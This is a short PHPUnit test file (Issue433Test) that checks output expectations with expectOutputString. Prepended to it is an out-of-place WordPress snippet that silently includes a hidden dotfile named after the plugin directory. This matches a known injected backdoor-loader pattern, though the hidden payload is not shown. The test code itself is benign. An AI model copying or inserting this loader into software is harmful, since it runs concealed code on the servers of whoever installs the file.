<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Issue433Test extends PHPUnit_Framework_TestCase
{
    public function testOutputWithExpectationBefore()
    {
        $this->expectOutputString('test');
        print 'test';
    }

    public function testOutputWithExpectationAfter()
    {
        print 'test';
        $this->expectOutputString('test');
    }

    public function testNotMatchingOutput()
    {
        print 'bar';
        $this->expectOutputString('foo');
    }
}
